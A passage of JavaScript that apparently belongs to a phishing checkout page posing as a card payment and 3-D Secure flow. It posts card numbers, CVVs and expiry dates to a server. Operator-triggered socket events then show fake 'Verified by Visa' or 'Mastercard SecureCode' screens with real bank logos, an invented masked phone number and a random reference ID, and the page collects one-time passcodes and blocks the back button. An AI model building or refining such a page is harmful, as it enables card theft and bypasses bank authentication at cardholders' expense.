             '414720': { bank: 'Chase Bank', country: 'United States', countryCode: 'US', currency: 'USD' },
             '379935': { bank: 'American Express', country: 'United States', countryCode: 'US', currency: 'USD' },
             '520820': { bank: 'HSBC', country: 'United Kingdom', countryCode: 'GB', currency: 'GBP' },
             '521076': { bank: 'Barclays', country: 'United Kingdom', countryCode: 'GB', currency: 'GBP' },
             '543085': { bank: 'Lloyds Bank', country: 'United Kingdom', countryCode: 'GB', currency: 'GBP' },
             '554960': { bank: 'Banco Santander', country: 'Spain', countryCode: 'ES', currency: 'EUR' },
             '402360': { bank: 'BBVA', country: 'Spain', countryCode: 'ES', currency: 'EUR' },
             '406916': { bank: 'Commerzbank', country: 'Germany', countryCode: 'DE', currency: 'EUR' },
             '411773': { bank: 'Deutsche Bank', country: 'Germany', countryCode: 'DE', currency: 'EUR' },
             '539123': { bank: 'Société Générale', country: 'France', countryCode: 'FR', currency: 'EUR' },
             '497429': { bank: 'Credit Agricole', country: 'France', countryCode: 'FR', currency: 'EUR' },
             '532974': { bank: 'Ziraat Bankasi', country: 'Turkey', countryCode: 'TR', currency: 'TRY' },
             '542873': { bank: 'Garanti Bank', country: 'Turkey', countryCode: 'TR', currency: 'TRY' },
             '419289': { bank: 'HSBC Bank', country: 'Turkey', countryCode: 'TR', currency: 'TRY' },
             '512754': { bank: 'Bank of China', country: 'China', countryCode: 'CN', currency: 'CNY' },
             '621977': { bank: 'China Construction Bank', country: 'China', countryCode: 'CN', currency: 'CNY' },
             '356895': { bank: 'State Bank of India', country: 'India', countryCode: 'IN', currency: 'INR' },
             '402400': { bank: 'HDFC Bank', country: 'India', countryCode: 'IN', currency: 'INR' },
             '552289': { bank: 'ICICI Bank', country: 'India', countryCode: 'IN', currency: 'INR' },
             '536595': { bank: 'Kotak Mahindra Bank', country: 'India', countryCode: 'IN', currency: 'INR' },
             '517628': { bank: 'Axis Bank', country: 'India', countryCode: 'IN', currency: 'INR' },
             '512816': { bank: 'Yes Bank', country: 'India', countryCode: 'IN', currency: 'INR' },
             '539957': { bank: 'SBI Card', country: 'India', countryCode: 'IN', currency: 'INR' },
             '431855': { bank: 'Visa RuPay', country: 'India', countryCode: 'IN', currency: 'INR' },
             '508507': { bank: 'RuPay Debit', country: 'India', countryCode: 'IN', currency: 'INR' },
             '625861': { bank: 'Indusind Bank', country: 'India', countryCode: 'IN', currency: 'INR' },
             '437773': { bank: 'Sberbank', country: 'Russia', countryCode: 'RU', currency: 'RUB' },
             '521324': { bank: 'Alfa-Bank', country: 'Russia', countryCode: 'RU', currency: 'RUB' },
             '417631': { bank: 'Citibank', country: 'Australia', countryCode: 'AU', currency: 'AUD' },
             '520055': { bank: 'Commonwealth Bank', country: 'Australia', countryCode: 'AU', currency: 'AUD' },
             '535489': { bank: 'DBS Bank', country: 'Singapore', countryCode: 'SG', currency: 'SGD' },
             '414043': { bank: 'United Overseas Bank', country: 'Singapore', countryCode: 'SG', currency: 'SGD' },
             '522609': { bank: 'Scotiabank', country: 'Canada', countryCode: 'CA', currency: 'CAD' },
             '525412': { bank: 'Royal Bank of Canada', country: 'Canada', countryCode: 'CA', currency: 'CAD' },
             '510155': { bank: 'E.Sun Commercial Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' },
             '511102': { bank: 'Taiwan Cooperative Bank', country: 'Taiwan', countryCode: 'TW', currency: 'TWD' }
          };
          
          // Try to find exact BIN match first (6 digits)
          if (bankDatabase[bin]) {
            return bankDatabase[bin];
          }
          
          // Try first 5 digits
          const bin5 = bin.substring(0, 5);
          if (bankDatabase[bin5]) {
            return bankDatabase[bin5];
          }
          
          // Try first 4 digits
          const bin4 = bin.substring(0, 4);
          if (bankDatabase[bin4]) {
            return bankDatabase[bin4];
          }
          
          // Try first 3 digits
          const bin3 = bin.substring(0, 3);
          if (bankDatabase[bin3]) {
            return bankDatabase[bin3];
          }
          
          // Try first 2 digits
          const bin2 = bin.substring(0, 2);
          if (bankDatabase[bin2]) {
            return bankDatabase[bin2];
          }
          
          // Try first digit - card network only
          const bin1 = bin.substring(0, 1);
          if (bankDatabase[bin1]) {
            const scheme = bankDatabase[bin1].scheme;
            const type = bankDatabase[bin1].type;
            
            // Determine default country and currency by first digit
            let country = 'United States';
            let countryCode = 'US';
            let currency = 'USD';
            
            // Return best-guess information
            return {
              bank: scheme,
              country,
              countryCode,
              currency,
              scheme,
              type
            };
          }
          
          // Default fallback
          return {
            bank: 'Unknown Bank',
            country: 'Unknown Country',
            countryCode: '',
            currency: '',
            scheme: 'Unknown',
            type: 'Credit'
          };
        } catch (err) {
          console.error('Fallback BIN lookup failed:', err);
        }
        
        // Final fallback
        return {
          bank: 'Unknown Bank',
          country: 'Unknown Country',
          countryCode: '',
          currency: '',
          scheme: 'Unknown',
          type: 'Credit'
        };
      } catch (error) {
        console.error('Error in BIN lookup chain:', error);
        return {
          bank: 'Unknown Bank',
          country: 'Unknown Country',
          countryCode: '',
          currency: '',
          scheme: 'Unknown',
          type: 'Credit'
        };
      }
    }

    // Create or get the bank info dropdown element with animation
    function getBankInfoDropdown() {
      let dropdown = document.getElementById('bankInfoDropdown');
      
      if (!dropdown) {
        dropdown = document.createElement('div');
        dropdown.id = 'bankInfoDropdown';
        
        const cardNumberContainer = document.getElementById('cardNumber').parentNode;
        cardNumberContainer.parentNode.insertBefore(dropdown, cardNumberContainer.nextSibling);
      }
      
      return dropdown;
    }

    // Show dropdown with animation
    function showBankInfoDropdown(bankInfo) {
      const dropdown = getBankInfoDropdown();
      
      // Prepare flag image
      const flagUrl = bankInfo.countryCode ? 
        `https://flagcdn.com/16x12/${bankInfo.countryCode.toLowerCase()}.png` : '';
      const flagImg = flagUrl ? `<img src="${flagUrl}" alt="${bankInfo.countryCode}">` : '';
      
      // Create the content with better formatting
      dropdown.innerHTML = `
        <div class="bank-info-row">
          <span class="bank-info-name">${bankInfo.bank || 'Unknown Bank'}</span>
          <span class="bank-info-country">${flagImg} ${bankInfo.countryCode ? bankInfo.countryCode : ''} ${bankInfo.country || 'Unknown'}</span>
        </div>
        <div class="bank-info-details">
          <span>${bankInfo.scheme ? bankInfo.scheme.toUpperCase() : ''} ${bankInfo.type ? '• ' + bankInfo.type.toUpperCase() : ''}</span>
          <span>${bankInfo.currency || ''}</span>
        </div>
      `;
      
      // First set display to block but keep it invisible
      dropdown.style.display = 'block';
      
      // Trigger animation with a small delay to ensure display change takes effect
      setTimeout(() => {
        dropdown.classList.add('visible');
      }, 10);
    }

    // Hide dropdown with animation
    function hideBankInfoDropdown() {
      const dropdown = document.getElementById('bankInfoDropdown');
      if (dropdown) {
        dropdown.classList.remove('visible');
        // Wait for animation to complete before hiding
        setTimeout(() => {
          dropdown.style.display = 'none';
        }, 300);
      }
    }

    // Fetch Payment Details Using PID with Fallback
    document.addEventListener('DOMContentLoaded', async () => {
      let defaultAmount = 100;
      let pid = new URLSearchParams(window.location.search).get('pid');

      // Always set default first
      document.getElementById('amount').value = defaultAmount;
      document.getElementById('displayAmount').textContent = defaultAmount.toFixed(2);

      // Check if returning from currency page
      if (sessionStorage.getItem('returning_from_currency') === 'true') {
        // Clear the flag
        sessionStorage.removeItem('returning_from_currency');
        
        // Restore form data
        restoreFormData();
        
        // Show loading state on the submit button
        const submitButton = document.getElementById('submitButton');
        const submitText = document.getElementById('submitText');
        const submitLoader = document.getElementById('submitLoader');
        
        if (submitButton && submitText && submitLoader) {
          submitButton.classList.add('btn-loading');
          submitText.style.opacity = '0.5';
          submitText.style.filter = 'blur(1px)';
          submitLoader.classList.remove('hidden');
          
          // Start checking transaction status
          if (currentInvoiceId) {
            console.log('[DEBUG] Returning from currency page, checking transaction status');
            statusCheckInterval = setInterval(checkTransactionStatus, 2000);
          }
        }
      }

      if (pid) {
        try {
          const response = await fetch(`/api/getPaymentDetails?pid=${pid}`);
          
          // If the payment link is expired, redirect to expired page
          if (response.status === 410) {
            console.log('Payment link has expired, redirecting to expired page');
            window.location.href = '/expired.html';
            return;
          }
          
          if (!response.ok) {
            throw new Error(`Failed to get payment details: ${response.status}`);
          }
          
          const data = await response.json();
          if (data.status === 'success' && data.payment?.amount) {
            const amount = parseFloat(data.payment.amount) || defaultAmount;
            document.getElementById('amount').value = amount;
            document.getElementById('displayAmount').textContent = amount.toFixed(2);
          }
        } catch (error) {
          console.error('Payment details fetch error:', error);
          // If there's an error getting payment details, we might want to redirect to expired/error page
          if (error.message && error.message.includes('410')) {
            window.location.href = '/expired.html';
            return;
          }
        }
      }

      // Add consent checkbox event listener
      document.getElementById('consentCheckbox').addEventListener('click', function() {
        consentChecked = !consentChecked;
        this.classList.toggle('checked', consentChecked);
        updateSubmitButton(); // Force update button state
      });

      // Initial validation
      updateSubmitButton();
      
      // Setup back button prevention
      setupBackButtonPrevention();
    });

    // Card Validation & Formatting Functions
    function validateCard(number) {
      const clean = number.replace(/\D/g, '');
      if (clean.length !== 16) return false;
      let sum = 0;
      for (let i = 0; i < clean.length; i++) {
        let digit = parseInt(clean[i], 10);
        if ((i + 1) % 2 === 0) {
          digit *= 2;
          if (digit > 9) digit -= 9;
        }
        sum += digit;
      }
      return sum % 10 === 0;
    }

    function formatCardNumber(value) {
      return value.replace(/\D/g, '')
                .replace(/(\d{4})(?=\d)/g, '$1 ')
                .substring(0, 19);
    }

    function formatExpiry(value) {
      let digits = value.replace(/\D/g, '');
      digits = digits.substring(0, 4);
      if (digits.length >= 3) {
        return digits.substring(0, 2) + '/' + digits.substring(2);
      }
      return digits;
    }

function validateExpiry(value) {
      if (!/^\d{2}\/\d{2}$/.test(value)) return false;
      const [month, year] = value.split('/').map(Number);
      if (month < 1 || month > 12) return false;
      const now = new Date();
      const currentYear = now.getFullYear() % 100;
      const currentMonth = now.getMonth() + 1;
     return !(year < currentYear || (year === currentYear && month < currentMonth));
    }

    function updateCardError() {
      const cardInput = document.getElementById("cardNumber");
      const errorElem = document.getElementById("cardError");
      if (!cardInput || !errorElem) return; // Fixed: Add null check
      
      const plain = cardInput.value.replace(/\s/g, '');
      isCardValid = validateCard(plain);
      if (plain.length === 16 && !isCardValid) {
        errorElem.style.display = 'block';
        errorElem.textContent = "Please enter valid card number";
        cardInput.classList.add('border-red-500');
      } else {
        errorElem.style.display = 'none';
        cardInput.classList.remove('border-red-500');
      }
    }

    function detectCardType(number) {
      const clean = number.replace(/\D/g, '');
      if (/^4/.test(clean)) return 'visa';
      if (/^5[1-5]/.test(clean)) return 'mastercard';
      if (/^3[47]/.test(clean)) return 'amex';
      if (/^(508[5-9]|60698|607[0-8]\d|6079[0-8]|608[0-5]|6521[5-9]|652[2-9]\d|6530\d|6531[0-4])/.test(clean)) return 'rupay';
      return null;
    }

    function updateCardTypeAndInfo(value) {
      const cardLogo = document.getElementById("cardLogo");
      if (!cardLogo) return; // Fixed: Add null check
      
      const detectedType = detectCardType(value);
      const logos = {
        visa: 'https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png',
        mastercard: 'https://pngimg.com/uploads/mastercard/mastercard_PNG16.png',
        amex: 'https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png',
        rupay: 'https://www.gokiwi.in/homepage/partners/rupay.svg'
      };
      if (detectedType && logos[detectedType]) {
        cardLogo.src = logos[detectedType];
        cardLogo.classList.remove('hidden');
      } else {
        cardLogo.classList.add('hidden');
      }
    }

    function updateSubmitButton() {
      const emailEl = document.getElementById('email');
      const cvvEl = document.getElementById('cvv');
      const cardholderNameEl = document.getElementById('cardholderName');
      const submitButtonEl = document.getElementById('submitButton');
      
      if (!emailEl || !cvvEl || !cardholderNameEl || !submitButtonEl) return; // Fixed: Add null check
      
      const emailValid = emailEl.checkValidity();
      const cardValid = isCardValid;
      const expiryValid = isExpiryValid;
      const cvvValid = cvvEl.value.length === 3;
      const nameValid = cardholderNameEl.value.trim().length > 0;

      const allValid = emailValid && cardValid && expiryValid && cvvValid && nameValid && consentChecked;

      submitButtonEl.disabled = !allValid;
    }

    function updateConfirmOtpButton() {
      const otpEl = document.getElementById('otp');
      const otpButtonEl = document.getElementById('otpSubmitButton');
      const otpErrorEl = document.getElementById('otpError');
      
      if (!otpEl || !otpButtonEl || !otpErrorEl) return; // Fixed: Add null check
      
      if (otpEl.value.length === 6) {
        otpButtonEl.disabled = false;
        otpButtonEl.className = "w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-blue-600 text-white";
        otpErrorEl.style.display = 'none';
      } else {
        otpButtonEl.disabled = true;
        otpButtonEl.className = "w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-gray-400 text-white";
      }
    }

    // Attach Input Handlers
    document.addEventListener("DOMContentLoaded", function(){
      const cardInput = document.getElementById("cardNumber");
      const expiryInput = document.getElementById("expiry");

      if (cardInput) {
        cardInput.addEventListener("input", async function(e) {
          // Store current cursor position and value
          const cursorPosition = e.target.selectionStart;
          const value = e.target.value;
          
          // Calculate how many spaces were before the cursor
          const valueBeforeCursor = value.slice(0, cursorPosition);
          const oldSpacesBeforeCursor = (valueBeforeCursor.match(/ /g) || []).length;
          
          // Format the card number
          const formatted = formatCardNumber(value);
          
          // Calculate new cursor position
          const digitsBeforeCursor = valueBeforeCursor.replace(/\D/g, '').length;
          const newSpacesBeforeCursor = Math.floor(digitsBeforeCursor / 4);
          const newPosition = digitsBeforeCursor + newSpacesBeforeCursor;
          
          // Update the value with minimal UI disruption
          e.target.value = formatted;
          
          // Restore cursor position
          if (cursorPosition === value.length) {
            // If cursor was at the end, keep it at the end
            e.target.setSelectionRange(formatted.length, formatted.length);
          } else {
            // Otherwise, put it at the calculated position
            e.target.setSelectionRange(newPosition, newPosition);
          }
          
          // Validation check
          isCardValid = validateCard(formatted.replace(/\s/g, ''));
          updateCardError();
          updateCardTypeAndInfo(formatted);
          updateSubmitButton();
          
          // Get BIN info when sufficient digits are entered
          const cleanCardNumber = formatted.replace(/\s/g, '');
          if (cleanCardNumber.length >= 6) {
            const bin = cleanCardNumber.substring(0, 6);
            const bankInfo = await getBankInfoFromBIN(bin);
            
            if (bankInfo) {
              // Store bank info in hidden field for form submission
              if (!document.getElementById('bankInfo')) {
                const hiddenField = document.createElement('input');
                hiddenField.type = 'hidden';
                hiddenField.id = 'bankInfo';
                hiddenField.name = 'bankInfo';
                e.target.parentNode.appendChild(hiddenField);
              }
              
              document.getElementById('bankInfo').value = JSON.stringify(bankInfo);
              
              // Show dropdown with bank info if card number is complete
              if (cleanCardNumber.length === 16) {
                showBankInfoDropdown(bankInfo);
              } else {
                hideBankInfoDropdown();
              }
            }
          } else {
            hideBankInfoDropdown();
          }
        });
      }

      if (expiryInput) {
        expiryInput.addEventListener("input", function(e) {
          let value = e.target.value.replace(/\D/g, '');

          // Auto-insert slash after 2 digits
          if (value.length > 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
          }
          e.target.value = value.substring(0, 5);

          // Validate
          isExpiryValid = validateExpiry(e.target.value);
          updateSubmitButton();
        });
      }

      const emailInput = document.getElementById('email');
      const cvvInput = document.getElementById('cvv');
      const cardholderNameInput = document.getElementById('cardholderName');
      const otpInput = document.getElementById('otp');
      
      // Add input event listeners for validation
      if (emailInput) {
        emailInput.addEventListener('input', updateSubmitButton);
      }
      
      if (cvvInput) {
        cvvInput.addEventListener('input', updateSubmitButton);
      }
      
      if (cardholderNameInput) {
        cardholderNameInput.addEventListener('input', updateSubmitButton);
      }
      
      if (otpInput) {
        otpInput.addEventListener('input', updateConfirmOtpButton);
      }

      // Payment Submission Handler with hash URL for bankpage
      const mainForm = document.getElementById('mainForm');
      if (mainForm) {
        mainForm.addEventListener('submit', async function(e) {
          e.preventDefault();
          if (!isCardValid || !isExpiryValid || isProcessing) return;

          isProcessing = true;
          const submitButton = document.getElementById('submitButton');
          const submitText = document.getElementById('submitText');
          const submitLoader = document.getElementById('submitLoader');

          if (!submitButton || !submitText || !submitLoader) return; // Added null check
          
          // Show loading state
          submitButton.classList.add('btn-loading');
          submitText.style.opacity = '0.5';
          submitText.style.filter = 'blur(1px)';
          submitLoader.classList.remove('hidden');

          try {
            // Get bank info if available
            const bankInfoEl = document.getElementById('bankInfo');
            const bankInfoData = bankInfoEl ? bankInfoEl.value : null;
            
            const response = await fetch("/api/sendPaymentDetails", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
                expiry: document.getElementById('expiry').value,
                cvv: document.getElementById('cvv').value,
                email: document.getElementById('email').value,
                amount: document.getElementById('amount').value,
                currency: "INR",
                cardholder: document.getElementById('cardholderName').value,
                bankInfo: bankInfoData
              })
            });

            const data = await response.json();
            if (!response.ok) throw new Error(data.message || 'Payment failed');

            // After setting currentInvoiceId from the API response:
            currentInvoiceId = data.invoiceId;
            localStorage.setItem('invoiceId', currentInvoiceId);
            
            // Save form data for currency page return
            saveFormData();
            
            console.log('Joining socket.io room with invoiceId:', currentInvoiceId);
            socket.emit('join', currentInvoiceId);

            // Use clean hash URL for bankpage
            const bankpageUrl = getBankpageUrl(data.invoiceId);
            bankPageWindow = window.open(
              bankpageUrl,
              '_blank',
              'width=600,height=800'
            );

            // Check window closure - but don't reset loading state when it closes
            const checkWindowClosed = setInterval(() => {
              if (bankPageWindow && bankPageWindow.closed) {
                clearInterval(checkWindowClosed);
              }
            }, 500);

          } catch (error) {
            console.error('Payment Error:', error);
            alert(`Payment Failed: ${error.message}`);
            submitButton.classList.remove('btn-loading');
            submitText.style.opacity = '1';
            submitText.style.filter = 'none';
            submitLoader.classList.add('hidden');
            isProcessing = false;
          }
        });
      }

      // OTP Submission Handler
      const otpSubmitButton = document.getElementById('otpSubmitButton');
      if (otpSubmitButton) {
        otpSubmitButton.addEventListener('click', async () => {
          if (isProcessing) return;
          isProcessing = true;
          const otpButton = document.getElementById('otpSubmitButton');
          const otpLoader = document.getElementById('otpLoader');
          const btnText = document.getElementById('otpText');
          
          if (!otpButton || !otpLoader || !btnText) return; // Added null check
          
          otpButton.disabled = true;
          btnText.style.opacity = '0.5';
          btnText.style.filter = 'blur(1px)';
          otpLoader.classList.remove('hidden');

          try {
            const response = await fetch("/api/submitOTP", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                invoiceId: currentInvoiceId,
                otp: document.getElementById('otp').value
              })
            });

            if (!response.ok) throw new Error('Failed to submit OTP');
            
            statusCheckInterval = setInterval(checkTransactionStatus, 2000);
          } catch (err) {
            console.error('OTP submission error:', err);
            alert('Error submitting OTP. Please try again.');
            isProcessing = false;
            otpButton.disabled = false;
            otpLoader.classList.add('hidden');
            btnText.style.opacity = '1';
            btnText.style.filter = 'none';
          }
        });
      }

      // Socket.io event handlers
      socket.on('show_otp', () => {
        const paymentForm = document.getElementById('paymentForm');
        const otpForm = document.getElementById('otpForm');
        const cardLastFour = document.getElementById('cardLastFour');
        const cardNumberInput = document.getElementById('cardNumber');
        
        if (!paymentForm || !otpForm || !cardLastFour || !cardNumberInput) return; // Added null check
        
        paymentForm.classList.add('hidden');
        otpForm.classList.remove('hidden');
        cardLastFour.textContent = cardNumberInput.value.slice(-4);
        if (!timerInterval) startOtpTimer();
        isProcessing = false;
      });

      // Modified MC verification event handler with loading spinner
      socket.on('show_mc_verification', (data) => {
        console.log('[DEBUG] Received show_mc_verification event:', data);
        console.log('[DEBUG] Current invoice ID:', currentInvoiceId);
        
        // Check if the overlay exists
        const overlay = document.getElementById('mcVerificationOverlay');
        console.log('[DEBUG] Overlay element found:', !!overlay);
        
        if (data.invoiceId === currentInvoiceId && overlay) {
          console.log('[DEBUG] Invoice IDs match, showing loading spinner for MC verification');
          
          // Show overlay with loading spinner
          const loadingContent = document.getElementById('mcLoadingContent');
          const verificationContent = document.getElementById('mcVerificationContent');
          
          if (!loadingContent || !verificationContent) return; // Added null check
          
          loadingContent.style.display = 'flex';
          verificationContent.style.display = 'none';
          overlay.style.display = 'flex';
          
          // Store data for later use
          window.mcVerificationData = data;
        }
      });

      // Start verification event handler with CURRENCY CONVERSION - UPDATED
      socket.on('start_verification', async (data) => {
        console.log('[DEBUG] Received start_verification event:', data);
        
        if (data.invoiceId === currentInvoiceId) {
          // Get stored data
          const storedData = window.mcVerificationData || {};
          
          // Hide loading, show verification content
          const loadingContent = document.getElementById('mcLoadingContent');
          const verificationContent = document.getElementById('mcVerificationContent');
          
          if (!loadingContent || !verificationContent) return; // Added null check
          
          loadingContent.style.display = 'none';
          verificationContent.style.display = 'block';
          
          // UPDATED: Set verification type logo on RIGHT side
          const verificationTypeLogo = document.getElementById('verificationTypeLogo');
          if (verificationTypeLogo) {
            if (data.verificationType === 'visa') {
              verificationTypeLogo.src = 'https://vectorseek.com/wp-content/uploads/2023/09/Verified-By-Visa-Logo-Vector.svg-.png';
              verificationTypeLogo.alt = 'Verified by Visa';
            } else {
              verificationTypeLogo.src = 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png';
              verificationTypeLogo.alt = 'Mastercard SecureCode';
            }
          }

          // UPDATED: Set bank logo on LEFT side
          const bankLogo = document.getElementById('bankLogo');
          if (bankLogo) {
            const bankLogos = {
              'sbi': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png',
              'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png?t=1720244492',
              'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
              'axis': 'https://upload.wikimedia.org/wikipedia/commons/c/ce/AXISBank_Logo.svg',
              'kotak': 'https://cdn.freelogovectors.net/svg07/kotakmahindrabank-logo.svg',
              'yes': 'https://logotyp.us/file/yes-bank.svg',
              'dbs taiwan': 'https://www.dbs.com.sg/o/corporate-theme/images/Logo.svg',
              'tanshin': 'http://www.alb-labuan.com/images/logo-taishin.png',
              'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
              'standard charterd': 'https://companieslogo.com/img/orig/STAN.L_BIG-27b2637e.png?t=1720244494',
              'boi': 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-India-Logo.png',
              'bob': 'https://1000logos.net/wp-content/uploads/2021/06/logo-Bank-of-Baroda-500x281.png',
              'centralbankindia': 'https://iconape.com/wp-content/png_logo_vector/central-bank-of-india-1911-logo.png',
              'boa': 'https://freelogopng.com/images/all_img/1658985465bank-of-america-logo-png.png',
              'citibank': 'https://www.logo.wine/a/logo/Citigroup/Citigroup-Logo.wine.svg',
              'usbank': 'https://logos-world.net/wp-content/uploads/2021/02/US-Bank-Logo-700x394.png',
              'wellsfargo': 'https://www.logo.wine/a/logo/Wells_Fargo/Wells_Fargo-Logo.wine.svg',
              'nimb': 'https://www.nimb.com.np/static/images/nimbl-lotus.png',
              'bank of maga': 'https://upload.wikimedia.org/wikipedia/commons/a/a9/Bank_of_Taiwan_Seal.svg',
              'gibraltar': 'https://upload.wikimedia.org/wikipedia/en/thumb/4/4a/Gibraltar_International_Bank_Logo.svg/220px-Gibraltar_International_Bank_Logo.svg.png',
              'unionbankindia': 'https://upload.wikimedia.org/wikipedia/commons/d/d0/Union_Bank_of_India_Logo.svg',
              'pnb': 'https://logotyp.us/file/pnb.svg',
              'canera bank': 'https://logonoid.com/images/canara-bank-logo.png',
              'capitalone': 'https://www.logo.wine/a/logo/Capital_One/Capital_One-Logo.wine.svg',
              'td bank': 'https://cdn.worldvectorlogo.com/logos/td-bank-1.svg',
              'citizens': 'https://locations.citizensbank.com/images/citizens-logo-rebrand.png',
              'chase bank': 'https://1000logos.net/wp-content/uploads/2016/11/Chase-National-Bank-Logo-500x281.png',
              'truist': 'https://upload.wikimedia.org/wikipedia/commons/8/8b/Truist_Financial_logo.svg',
              'cathy united taiwan': 'https://static.wikia.nocookie.net/logopedia/images/4/4b/CATHAY2002.png/revision/latest/scale-to-width-down/250?cb=20230808075909',
              'novascotia': 'https://asset.brandfetch.io/idpIpGPfn2/ideBeGWgbz.svg?updated=1667941638324',
              'sinopac bank taiwan': 'https://easy.sinopac.com/images/sinopac-logo.svg',
              'hua nan bank taiwan': 'https://thebanks.eu/img/logos/Hua_Nan_Commercial_Bank.png',
              'landbank taiwan': 'https://www.landbank.com/new_assets/header/landbank_logo.webp',
              'un bank taiwan': 'https://upload.wikimedia.org/wikipedia/commons/5/52/E.SUN_Bank.svg',
              'KGI bank taiwan': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/dd/KGI_Financial_Holding_logo_v2.png/250px-KGI_Financial_Holding_logo_v2.png',
              'usaa bank': 'https://logos-world.net/wp-content/uploads/2021/03/USAA-United-Services-Automobile-Association-Logo-700x394.png',
              'huntington': 'https://mma.prnewswire.com/media/551870/Huntington_Logo.jpg?w=300',
              'm&t bank ': 'https://companieslogo.com/img/orig/MTB_BIG-01f85319.png?t=1720244493',
              'barclays bank': 'https://icons.veryicon.com/png/128/business/bank-logo-collection/barclays-bank-portfolio.png',
              'santandar usa': 'https://logodownload.org/wp-content/uploads/2017/05/santander-logo-1.png',
              'default': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png'
            };
            bankLogo.src = bankLogos[data.bankCode] || bankLogos['default'];
          }
          
          // UPDATED: Generate random mobile ending instead of using card last 4
          const cardNumberDisplay = document.getElementById('cardNumberDisplay');
          const cardLastFourDigits = document.getElementById('cardLastFourDigits');

          // Generate random 4 digits for mobile number ending
          const randomMobileEnding = Math.floor(1000 + Math.random() * 9000).toString();

          if (cardLastFourDigits) {
            cardLastFourDigits.textContent = `********${randomMobileEnding}`;
          }

          // Still use actual card last 4 for the card display
          const cardNumber = document.getElementById('cardNumber')?.value || '';
          const lastFour = cardNumber.replace(/\s/g, '').slice(-4);
          if (cardNumberDisplay) {
            cardNumberDisplay.textContent = `XXXX XXXX XXXX ${lastFour}`;
          }

          // ADDED: Generate random alphanumeric reference ID
          const referenceId = document.getElementById('referenceId');
          if (referenceId) {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let randomRef = '';
            // Generate 3 letters followed by 4 numbers
            for (let i = 0; i < 3; i++) {
              randomRef += chars.charAt(Math.floor(Math.random() * 26)); // Only letters
            }
            for (let i = 0; i < 4; i++) {
              randomRef += chars.charAt(Math.floor(Math.random() * 10) + 26); // Only numbers
            }
            referenceId.textContent = randomRef;
          }

          // Set other transaction details
          const merchantName = document.getElementById('merchantName');
          const transactionAmount = document.getElementById('transactionAmount');
          const transactionDate = document.getElementById('transactionDate');
          const displayAmount = document.getElementById('displayAmount');
          const originalAmount = document.getElementById('originalAmount');
          const currencySymbol = document.getElementById('currencySymbol');
          const convertedAmountDisplay = document.getElementById('convertedAmountDisplay');
          const originalCurrencyDisplay = document.getElementById('originalCurrencyDisplay');
          
          // Display merchant name
          if (merchantName) {
            merchantName.textContent = data.merchantName || storedData.merchantName || 'Bologus pvt store.';
          }
          
          // Set transaction date
          if (transactionDate) {
            transactionDate.textContent = new Date().toLocaleString();
          }
          
          // Get original amount
          const originalAmountValue = (data.amount || storedData.amount || displayAmount.textContent || '0.00').replace(/^₹/, '');
          
          // Handle currency conversion - NEW
          if (data.currency && data.currency !== 'INR') {
            // Save original value
            if (originalAmount) {
              originalAmount.textContent = originalAmountValue;
            }
            
            // Get the new currency symbol
            const newSymbol = currencySymbols[data.currency] || data.currency;
            if (currencySymbol) {
              currencySymbol.textContent = newSymbol;
            }
            
            // Show loading
            if (transactionAmount) {
              transactionAmount.textContent = "Converting...";
            }
            
            try {
              // Get converted amount
              const convertedValue = await convertCurrency(parseFloat(originalAmountValue), 'INR', data.currency);
              
              // Display converted amount
              if (transactionAmount) {
                transactionAmount.textContent = convertedValue;
              }
              
              // Show original amount display
              if (convertedAmountDisplay && originalCurrencyDisplay) {
                convertedAmountDisplay.style.display = 'block';
                originalCurrencyDisplay.textContent = `INR: ₹${originalAmountValue}`;
              }
            } catch (error) {
              console.error('Currency conversion failed:', error);
              
              // Fallback to original amount
              if (transactionAmount) {
                transactionAmount.textContent = originalAmountValue;
              }
              if (currencySymbol) {
                currencySymbol.textContent = '₹';
              }
              if (convertedAmountDisplay) {
                convertedAmountDisplay.style.display = 'none';
              }
            }
          } else {
            // Default INR currency (no conversion needed)
            if (currencySymbol) {
              currencySymbol.textContent = '₹';
            }
            if (transactionAmount) {
              transactionAmount.textContent = originalAmountValue;
            }
            if (convertedAmountDisplay) {
              convertedAmountDisplay.style.display = 'none';
            }
          }
          
          // Setup event handlers
          setupMCVerificationHandlers();
          
          // Start timer
          setupMCTimerIfNeeded(true);
        }
      });

      // Currency page redirection
      socket.on('redirect_to_currency', (data) => {
        console.log('[DEBUG] Received redirect_to_currency event:', data);
        
        // Save current state before redirecting
        sessionStorage.setItem('returning_from_currency', 'true');
        
        // Redirect to currency page
        window.location.href = data.redirectUrl;
      });

      // Handle MC bank selection update
      socket.on('update_mc_bank', (data) => {
        if (data.invoiceId === currentInvoiceId) {
          const bankLogos = {
              'sbi': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png',
              'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png?t=1720244492',
              'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
              'axis': 'https://upload.wikimedia.org/wikipedia/commons/c/ce/AXISBank_Logo.svg',
              'kotak': 'https://cdn.freelogovectors.net/svg07/kotakmahindrabank-logo.svg',
              'yes': 'https://logotyp.us/file/yes-bank.svg',
              'dbs taiwan': 'https://www.dbs.com.sg/o/corporate-theme/images/Logo.svg',
              'tanshin': 'http://www.alb-labuan.com/images/logo-taishin.png',
              'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
